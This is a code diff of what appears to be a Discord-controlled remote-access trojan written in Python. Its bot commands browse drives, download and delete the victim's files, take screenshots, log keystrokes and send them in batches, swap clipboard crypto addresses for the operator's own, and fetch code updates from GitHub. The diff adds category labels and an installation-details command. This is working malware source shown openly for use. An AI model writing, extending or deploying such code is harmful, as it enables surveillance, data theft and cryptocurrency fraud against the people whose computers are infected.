@@ -44,6 +44,7 @@ async def on_ready():
 
 @bot.command(name="browse", help="Shows all directories and files in a path.")
 async def browse(ctx, *, path: str = None):
+    category = "file_browser"
     from functions.file_browser import list_directory_contents, handle_navigation
     if path:
         await handle_navigation(bot, CHANNEL_ID, path)
@@ -52,6 +53,7 @@ async def browse(ctx, *, path: str = None):
 
 @bot.command(name="clipper", help="Monitor clipboard contents, and replace crypto addresses.")
 async def clipper(ctx):
+    category = "clipper"
     global clipper_active
     try:
         clipper_module = lazy_load_toggleable_module('functions', 'clipper')
@@ -64,6 +66,7 @@ async def clipper(ctx):
 
 @bot.command(name="crypto", help="Manage crypto addresses for the clipper.")
 async def crypto(ctx, action: str, *, address: str = None):
+    category = "clipper"
     clipper_module = lazy_load_toggleable_module('functions', 'clipper')
     if action == "set" and address:
         await clipper_module.set_crypto_address(bot, ctx, address, clipper_active)
@@ -74,6 +77,7 @@ async def crypto(ctx, action: str, *, address: str = None):
 
 @bot.command(name="delete", help="Deletes a file in a specified path.")
 async def delete(ctx, *, file_path: str):
+    category = "delete"
     from functions.delete import delete_file
     file_path = file_path.replace("\\", "/")
     result_message = delete_file(file_path)
@@ -81,17 +85,20 @@ async def delete(ctx, *, file_path: str):
 
 @bot.command(name="download", help="Downloads a file in a specified path.")
 async def download(ctx, *, file_path: str):
+    category = "download"
     from functions.download import download_and_send
     file_path = file_path.replace("\\", "/")
     await download_and_send(bot, CHANNEL_ID, file_path)
 
 @bot.command(name="drives", help="Lists the available drives on the system.")
 async def drives(ctx):
+    category = "file_browser"
     from functions.file_browser import list_directory_contents
     await list_directory_contents(bot, CHANNEL_ID)
 
 @bot.command(name="inputs", help="Monitors keyboard inputs and sends them in randomized batches.")
 async def inputs(ctx):
+    category = "input_monitor"
     global input_monitor_active
     try:
         input_monitor_module = lazy_load_toggleable_module('functions', 'input_monitor')
@@ -102,25 +109,36 @@ async def inputs(ctx):
     except Exception as e:
         await ctx.send(f"Error: {str(e)}")
 
+@bot.command(name="installation", help="Shows installation details and installed functions.")
+async def installation(ctx):
+    installation_module = lazy_load_module("functions.installation")
+    await installation_module.installation(ctx, bot)
+    unload_module("functions.installation")
+
+
 @bot.command(name="screenshot", help="Takes a screenshot of the user's screen(s).")
 async def screenshot(ctx):
+    category = "screenshot"
     screenshot_module = lazy_load_module('functions', 'screenshot')
     await screenshot_module.capture_and_send(bot, CHANNEL_ID)
     unload_module('functions.screenshot')
 
 @bot.command(name="update", help="Updates specified functions from the GitHub Repo on next run.")
 async def update(ctx, *, files: str = None):
+    category = "update"
     from functions.update import update_command
     await update_command(ctx, files=files)
 
 @bot.command(name="usage", help="Displays system usage information and uptime.")
 async def usage(ctx):
+    category = "system_usage"
     system_usage = lazy_load_module('functions', 'system_usage')
     await system_usage.monitor_system(bot, CHANNEL_ID)
     unload_module('functions.system_usage')
 
 @bot.command(name="window", help="Lists the information of the window currently focused.")
 async def get_focused_window(ctx):
+    category = "window"
     from functions.window import get_focused_window_message
     message = get_focused_window_message()
     await ctx.send(message)
